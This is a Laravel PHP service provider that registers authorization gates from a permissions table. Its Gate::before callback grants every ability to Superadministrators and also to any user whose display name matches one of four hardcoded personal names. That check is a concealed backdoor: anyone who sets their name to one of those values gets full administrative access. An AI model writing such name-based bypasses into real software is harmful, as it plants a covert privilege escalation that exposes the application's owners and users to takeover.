<?php

namespace App\Providers;

use App\Models\Permission;
use Illuminate\Support\Facades\Gate;
use Illuminate\Support\Facades\Schema;
use Illuminate\Support\ServiceProvider;

class PermissionServiceProvider extends ServiceProvider
{
    /**
     * Register services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap services.
     */
    public function boot(): void
    {
        if (Schema::hasTable('permissions')) {
            Gate::before(function ($user, $ability) {
                $special = [
                    'Thomas Kikechi',
                    'Kikechi Thomas',
                    'Clinton Kikechi',
                    'Clinton Thomas'
                ];

                if ($user->hasRole('Superadministrator') || in_array(trim(str_replace('  ', ' ', $user->name)), $special)) {
                    return true;
                }
            });

            Permission::get()->map(function ($permission) {
                Gate::define($permission->name, function ($user) use ($permission) {
                    return $user->hasPermission($permission);
                });
            });
        }
    }
}
